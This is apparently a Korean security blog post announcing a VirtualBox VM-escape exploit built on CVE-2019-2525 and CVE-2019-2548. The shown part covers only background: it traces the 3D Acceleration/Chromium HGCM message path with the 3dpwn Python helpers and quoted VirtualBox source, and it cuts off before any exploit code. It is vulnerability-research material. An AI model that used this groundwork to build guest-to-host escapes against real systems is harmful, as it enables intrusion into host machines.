&lt;li&gt;VirtaulBox는 3D Acceleration를 제공한다.&lt;/li&gt;
&lt;li&gt;보통 VM에서 3D기능을 사용하면 속도가 느려지는데&lt;/li&gt;
&lt;li&gt;3D Acceleration는 호스트(실제 컴퓨터의)의  3D 하드웨어를 사용하게 한다. &lt;/li&gt;
&lt;li&gt;(가상머신 -&amp;gt; 실제 하드웨어 접근)</description>
      
      
      
      <content:encoded><![CDATA[<ul><li>CVE-2019-2525과 CVE-2019-2548을 이용한 VM exploit.</li></ul><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h3 id="3D-Acceleration"><a href="#3D-Acceleration" class="headerlink" title="3D Acceleration"></a>3D Acceleration</h3><ul><li>VirtaulBox는 3D Acceleration를 제공한다.</li><li>보통 VM에서 3D기능을 사용하면 속도가 느려지는데</li><li>3D Acceleration는 호스트(실제 컴퓨터의)의  3D 하드웨어를 사용하게 한다. </li><li>(가상머신 -&gt; 실제 하드웨어 접근)<span id="more"></span></li></ul><h3 id="Chromium"><a href="#Chromium" class="headerlink" title="Chromium"></a>Chromium</h3><ul><li>3D Acceleration은 Chromium 라이브러리를 기반으로 만들어졌다.</li><li>Chromium은 OpenGL기반으로 3D Graphic을 ‘remote rendering’ 할 수 있는 라이브러리다.</li><li>Client/Server 구조</li><li>VBox는 Chromium에 새로운 프로토콜을 추가했다.<ul><li>VBoxHGCM</li><li>HGCM : Host/Guest Communication Manager</li></ul></li><li>이 프로토콜을 사용하면, GuestOS에서 실행 중인 Chromium Client가 Host OS 실행 중인 Chromium 서버와 통신이 가능하다.</li><li>Linux에서는 /dev/vboxuser, /dev/vboxguest로 IOCTL 통신하는데,</li><li>이를 쉽게 사용할 수 있도록 구현한 Chromium python library가 존재한다. (<strong>3dpwn</strong>)</li></ul><h3 id="3dpwn-VBoxHGCM-wrapper-library"><a href="#3dpwn-VBoxHGCM-wrapper-library" class="headerlink" title="3dpwn (VBoxHGCM wrapper) library"></a>3dpwn (VBoxHGCM wrapper) library</h3><ul><li>Client의 역할은 connect, disconnect, send chromium message이다.</li><li>CRMessage Structure</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/138862910-0df39bf3-f008-42a0-af48-13230e76832e.png" alt="제목 없음"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    CRMessageHeader      header;</span><br><span class="line">    CRMessageOpcodes     opcodes;</span><br><span class="line">    CRMessageRedirPtr    redirptr;</span><br><span class="line">    CRMessageWriteback   writeback;</span><br><span class="line">    CRMessageReadback    readback;</span><br><span class="line">    CRMessageReadPixels  readPixels;</span><br><span class="line">    CRMessageMulti       multi;</span><br><span class="line">    CRMessageFlowControl flowControl;</span><br><span class="line">    CRMessageNewClient   newclient;</span><br><span class="line">    CRMessageGather      gather;</span><br><span class="line">&#125; CRMessage;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    CRMessageType          type;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>           conn_id;</span><br><span class="line">&#125; CRMessageHeader;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CRMessageOpcodes</span> &#123;</span></span><br><span class="line">    CRMessageHeader        header;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>           numOpcodes;</span><br><span class="line">&#125; CRMessageOpcodes;</span><br></pre></td></tr></table></figure><ul><li>Client가 보내야할 Message의 구조는 위와 같이 Opcode + data의 형태이다.</li></ul><ul><li>통신에 필요한 주요 함수</li><li>hgcm_connect</li><li>hgcm_disconnect </li><li>hgcm_call(conn_id,<strong>function</strong>,params)</li><li><strong>function</strong><ul><li>SHCRGL_GUEST_FN_WRITE_BUFFER</li><li>SHCRGL_GUEST_FN_WRITE_READ_BUFFERED</li></ul></li></ul><ul><li>3dpwn에서는 crmsg함수를 통해 통신한다.</li></ul><h3 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc_buf</span>(<span class="params">client, sz, msg=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">    buf,_,_,_ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [<span class="number">0</span>, sz, <span class="number">0</span>, msg])</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crmsg</span>(<span class="params">client, msg, bufsz=<span class="number">0x1000</span></span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; Allocate a buffer, write a Chromium message to it, and dispatch it. &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(msg) &lt;= bufsz</span><br><span class="line">    buf = alloc_buf(client, bufsz, msg)</span><br><span class="line">    <span class="comment"># buf,_,_,_ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0, bufsz, 0, msg])</span></span><br><span class="line">    _, res, _ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [buf, <span class="string">&quot;A&quot;</span>*bufsz, <span class="number">1337</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><ul><li>crmsg함수는 위에 CRMessage 형태의 msg를 인자로 받으며, alloc_buf를 호출한다.</li><li>alloc_buf에서는 SHCRGL_GUEST_FN_WRITE_BUFFER를 인자로 hgcm_call을 하게 된다.</li><li>이 때, 세번째 인자는 [0,sz,0,msg] 이다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> SHCRGL_GUEST_FN_WRITE_BUFFER:</span><br><span class="line">&#123;</span><br><span class="line">    Log((<span class="string">&quot;svcCall: SHCRGL_GUEST_FN_WRITE_BUFFER\n&quot;</span>));</span><br><span class="line">    <span class="comment">/* Verify parameter count and types. */</span></span><br><span class="line">    <span class="keyword">if</span> (cParms != SHCRGL_CPARMS_WRITE_BUFFER)</span><br><span class="line">    &#123;</span><br><span class="line">        rc = VERR_INVALID_PARAMETER;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span> (   paParms[<span class="number">0</span>].type != VBOX_HGCM_SVC_PARM_32BIT <span class="comment">/*iBufferID*/</span></span><br><span class="line">        || paParms[<span class="number">1</span>].type != VBOX_HGCM_SVC_PARM_32BIT <span class="comment">/*cbBufferSize*/</span></span><br><span class="line">        || paParms[<span class="number">2</span>].type != VBOX_HGCM_SVC_PARM_32BIT <span class="comment">/*ui32Offset*/</span></span><br><span class="line">        || paParms[<span class="number">3</span>].type != VBOX_HGCM_SVC_PARM_PTR   <span class="comment">/*pBuffer*/</span></span><br><span class="line">       )</span><br><span class="line">    &#123;</span><br><span class="line">        rc = VERR_INVALID_PARAMETER;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Fetch parameters. */</span></span><br><span class="line">        <span class="keyword">uint32_t</span> iBuffer      = paParms[<span class="number">0</span>].u.uint32;</span><br><span class="line">        <span class="keyword">uint32_t</span> cbBufferSize = paParms[<span class="number">1</span>].u.uint32;</span><br><span class="line">        <span class="keyword">uint32_t</span> ui32Offset   = paParms[<span class="number">2</span>].u.uint32;</span><br><span class="line">        <span class="keyword">uint8_t</span> *pBuffer      = (<span class="keyword">uint8_t</span> *)paParms[<span class="number">3</span>].u.pointer.addr;</span><br><span class="line">        <span class="keyword">uint32_t</span> cbBuffer     = paParms[<span class="number">3</span>].u.pointer.size;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Execute the function. */</span></span><br><span class="line">        CRVBOXSVCBUFFER_t *pSvcBuffer = svcGetBuffer(iBuffer, cbBufferSize);</span><br><span class="line">        <span class="keyword">if</span> (!pSvcBuffer || ((<span class="keyword">uint64_t</span>)ui32Offset+cbBuffer)&gt;cbBufferSize)</span><br><span class="line">        &#123;</span><br><span class="line">            rc = VERR_INVALID_PARAMETER;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)((<span class="keyword">uintptr_t</span>)pSvcBuffer-&gt;pData+ui32Offset), pBuffer, cbBuffer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Return the buffer id */</span></span><br><span class="line">            paParms[<span class="number">0</span>].u.uint32 = pSvcBuffer-&gt;uiId;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>parameter의 개수와 타입 검사를 한 후 세 번째 인자인 [0,sz,0,msg]를 알맞게 파싱해준다. ([bufID, bufSZ,offset,msg])</li><li>bufID와, msg의 크기를 인자로 svcGetBuffer함수를 호출하는데 이때 반환 값은 CRVBOXSVCBUFFER_t 구조체이다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CRVBOXSVCBUFFER_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> uiId;</span><br><span class="line">    <span class="keyword">uint32_t</span> uiSize;</span><br><span class="line">    <span class="keyword">void</span>*    pData;</span><br><span class="line">    _CRVBOXSVCBUFFER_t *pNext, *pPrev;</span><br><span class="line">&#125; CRVBOXSVCBUFFER_t;</span><br></pre></td></tr></table></figure><ul><li>CRVBOXSVCBUFFER_t 구조는 위와 같다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> CRVBOXSVCBUFFER_t* <span class="title">svcGetBuffer</span><span class="params">(<span class="keyword">uint32_t</span> iBuffer, <span class="keyword">uint32_t</span> cbBufferSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CRVBOXSVCBUFFER_t* pBuffer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iBuffer)</span><br><span class="line">    &#123;</span><br><span class="line">        pBuffer = g_pCRVBoxSVCBuffers;</span><br><span class="line">        <span class="keyword">while</span> (pBuffer)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (pBuffer-&gt;uiId == iBuffer)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (cbBufferSize &amp;&amp; pBuffer-&gt;uiSize!=cbBufferSize)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">static</span> <span class="keyword">int</span> shown=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (shown&lt;<span class="number">20</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        shown++;</span><br><span class="line">                        LogRel((<span class="string">&quot;OpenGL: svcGetBuffer: Invalid buffer(%i) size %i instead of %i\n&quot;</span>,</span><br><span class="line">                                iBuffer, pBuffer-&gt;uiSize, cbBufferSize));</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> pBuffer;</span><br><span class="line">            &#125;</span><br><span class="line">            pBuffer = pBuffer-&gt;pNext;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>svcGetBuffer함수는 인자로 받은 bufID,Size에 맞는 버퍼가 서버에 존재한다면 해당 주소를 반환한다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">else</span> <span class="comment">/*allocate new buffer*/</span></span><br><span class="line">    &#123;</span><br><span class="line">        pBuffer = (CRVBOXSVCBUFFER_t*) RTMemAlloc(<span class="keyword">sizeof</span>(CRVBOXSVCBUFFER_t));</span><br><span class="line">        <span class="keyword">if</span> (pBuffer)</span><br><span class="line">        &#123;</span><br><span class="line">            pBuffer-&gt;pData = RTMemAlloc(cbBufferSize);</span><br><span class="line">            <span class="keyword">if</span> (!pBuffer-&gt;pData)</span><br><span class="line">            &#123;</span><br><span class="line">                LogRel((<span class="string">&quot;OpenGL: svcGetBuffer: Not enough memory (%d)\n&quot;</span>, cbBufferSize));</span><br><span class="line">                RTMemFree(pBuffer);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            pBuffer-&gt;uiId = ++g_CRVBoxSVCBufferID;</span><br><span class="line">            <span class="keyword">if</span> (!pBuffer-&gt;uiId)</span><br><span class="line">            &#123;</span><br><span class="line">                pBuffer-&gt;uiId = ++g_CRVBoxSVCBufferID;</span><br><span class="line">            &#125;</span><br><span class="line">            Assert(pBuffer-&gt;uiId);</span><br><span class="line">            pBuffer-&gt;uiSize = cbBufferSize;</span><br><span class="line">            pBuffer-&gt;pPrev = <span class="literal">NULL</span>;</span><br><span class="line">            pBuffer-&gt;pNext = g_pCRVBoxSVCBuffers;</span><br><span class="line">            <span class="keyword">if</span> (g_pCRVBoxSVCBuffers)</span><br><span class="line">            &#123;</span><br><span class="line">                g_pCRVBoxSVCBuffers-&gt;pPrev = pBuffer;</span><br><span class="line">            &#125;</span><br><span class="line">            g_pCRVBoxSVCBuffers = pBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            LogRel((<span class="string">&quot;OpenGL: svcGetBuffer: Not enough memory (%d)\n&quot;</span>, <span class="keyword">sizeof</span>(CRVBOXSVCBUFFER_t)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>그렇지 않다면 새로 버퍼를 할당하고, 할당한 주소를 반환한다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">void</span>*)((<span class="keyword">uintptr_t</span>)pSvcBuffer-&gt;pData+ui32Offset), pBuffer, cbBuffer);</span><br></pre></td></tr></table></figure><ul><li>이 후 할당받은 CRVBOXSVCBUFFER_t 구조체 버퍼의 pdata에 인자로 주었던 offset만큼 더한 위치에 msg를 복사한다.</li><li>그림으로 정리하면 아래와 같다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/138871086-e138d173-8737-46f7-a005-e14118d29ac9.png" alt="23"></p><ul><li>hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [id, sz, offset, msg])에서 msg를 pdata+offset에 저장.</li></ul><hr><ul><li>alloc_buf호출 이 후 SHCRGL_GUEST_FN_WRITE_READ_BUFFERED를 인자로 다시 한 번 hgcm_call를 호출한다.</li><li>이 때, 세번째 인자는 [buf, “A”*bufsz, 1337] 이다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> SHCRGL_GUEST_FN_WRITE_READ_BUFFERED:</span><br><span class="line">&#123;</span><br><span class="line">    Log((<span class="string">&quot;svcCall: SHCRGL_GUEST_FN_WRITE_READ_BUFFERED\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Verify parameter count and types. */</span></span><br><span class="line">    <span class="keyword">if</span> (cParms != SHCRGL_CPARMS_WRITE_READ_BUFFERED)</span><br><span class="line">    &#123;</span><br><span class="line">        rc = VERR_INVALID_PARAMETER;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span> (    paParms[<span class="number">0</span>].type != VBOX_HGCM_SVC_PARM_32BIT   <span class="comment">/* iBufferID */</span></span><br><span class="line">         || paParms[<span class="number">1</span>].type != VBOX_HGCM_SVC_PARM_PTR     <span class="comment">/* pWriteback */</span></span><br><span class="line">         || paParms[<span class="number">2</span>].type != VBOX_HGCM_SVC_PARM_32BIT   <span class="comment">/* cbWriteback */</span></span><br><span class="line">         || !paParms[<span class="number">0</span>].u.uint32 <span class="comment">/*iBufferID can&#x27;t be 0 here*/</span></span><br><span class="line">       )</span><br><span class="line">    &#123;</span><br><span class="line">        rc = VERR_INVALID_PARAMETER;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Fetch parameters. */</span></span><br><span class="line">        <span class="keyword">uint32_t</span> iBuffer = paParms[<span class="number">0</span>].u.uint32;</span><br><span class="line">        <span class="keyword">uint8_t</span> *pWriteback  = (<span class="keyword">uint8_t</span> *)paParms[<span class="number">1</span>].u.pointer.addr;</span><br><span class="line">        <span class="keyword">uint32_t</span> cbWriteback = paParms[<span class="number">1</span>].u.pointer.size;</span><br><span class="line"></span><br><span class="line">        CRVBOXSVCBUFFER_t *pSvcBuffer = svcGetBuffer(iBuffer, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (!pSvcBuffer)</span><br><span class="line">        &#123;</span><br><span class="line">            LogRel((<span class="string">&quot;OpenGL: svcCall(WRITE_READ_BUFFERED): Invalid buffer (%d)\n&quot;</span>, iBuffer));</span><br><span class="line">            rc = VERR_INVALID_PARAMETER;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint8_t</span> *pBuffer     = (<span class="keyword">uint8_t</span> *)pSvcBuffer-&gt;pData;</span><br><span class="line">        <span class="keyword">uint32_t</span> cbBuffer    = pSvcBuffer-&gt;uiSize;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Execute the function. */</span></span><br><span class="line">        rc = crVBoxServerClientWrite(u32ClientID, pBuffer, cbBuffer);</span><br><span class="line">        <span class="keyword">if</span> (!RT_SUCCESS(rc))</span><br><span class="line">        &#123;</span><br><span class="line">            Assert(VERR_NOT_SUPPORTED==rc);</span><br><span class="line">            svcClientVersionUnsupported(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        rc = crVBoxServerClientRead(u32ClientID, pWriteback, &amp;cbWriteback);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (RT_SUCCESS(rc))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Update parameters.*/</span></span><br><span class="line">            paParms[<span class="number">1</span>].u.pointer.size = cbWriteback;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Return the required buffer size always */</span></span><br><span class="line">        paParms[<span class="number">2</span>].u.uint32 = cbWriteback;</span><br><span class="line"></span><br><span class="line">        svcFreeBuffer(pSvcBuffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>parameter의 개수와 타입 검사를 한 후 세 번째 인자인 [buf, “A”bufsz, 1337] 를 알맞게 파싱해준다.</li><li>그리고 다시 bufID와, 0을 인자로 svcGetBuffer함수를 호출한다.</li><li>반환된 pSvcBuffer를 통해 변수 pBuffer, cbBuffer를 설정하고 crVBoxServerClientWrite함수를 호출한다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">crVBoxServerClientWrite</span><span class="params">(<span class="keyword">uint32_t</span> u32ClientID, <span class="keyword">uint8_t</span> *pBuffer, <span class="keyword">uint32_t</span> cbBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CRClient *pClient=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int32_t</span> rc = crVBoxServerClientGet(u32ClientID, &amp;pClient);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (RT_FAILURE(rc))</span><br><span class="line">        <span class="keyword">return</span> rc;</span><br><span class="line"></span><br><span class="line">    CRASSERT(pBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This should never fire unless we start to multithread */</span></span><br><span class="line">    CRASSERT(pClient-&gt;conn-&gt;pBuffer==<span class="literal">NULL</span> &amp;&amp; pClient-&gt;conn-&gt;cbBuffer==<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pClient-&gt;conn-&gt;pBuffer = pBuffer;</span><br><span class="line">    pClient-&gt;conn-&gt;cbBuffer = cbBuffer;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> VBOX_WITH_CRHGSMI</span></span><br><span class="line">    CRVBOXHGSMI_CMDDATA_ASSERT_CLEANED(&amp;pClient-&gt;conn-&gt;CmdData);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    crVBoxServerInternalClientWriteRead(pClient);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> VINF_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>pClient 변수에 인자 정보를 저장하고 crVBoxServerInternalClientWriteRead 함수를 호출한다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">crVBoxServerInternalClientWriteRead</span><span class="params">(CRClient *pClient)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">    crNetRecv();</span><br><span class="line">    CRASSERT(pClient-&gt;conn-&gt;pBuffer==<span class="literal">NULL</span> &amp;&amp; pClient-&gt;conn-&gt;cbBuffer==<span class="number">0</span>);</span><br><span class="line">    CRVBOXHGSMI_CMDDATA_ASSERT_CLEANED(&amp;pClient-&gt;conn-&gt;CmdData);</span><br><span class="line"></span><br><span class="line">    crServerServiceClients();</span><br><span class="line">    crStateResetCurrentPointers(&amp;cr_server.current);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li> crServerServiceClients 함수를 호출한다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">crServerServiceClients</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RunQueue *q;</span><br><span class="line"></span><br><span class="line">    q = getNextClient(GL_FALSE); <span class="comment">/* don&#x27;t block */</span></span><br><span class="line">    <span class="keyword">while</span> (q) </span><br><span class="line">    &#123;</span><br><span class="line">        ClientStatus stat = crServerServiceClient(q);</span><br><span class="line">        <span class="keyword">if</span> (stat == CLIENT_NEXT &amp;&amp; cr_server.run_queue-&gt;next) &#123;</span><br><span class="line">            <span class="comment">/* advance to next client */</span></span><br><span class="line">            cr_server.run_queue = cr_server.run_queue-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        q = getNextClient(GL_FALSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>crServerServiceClient 함수를 호출한다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td 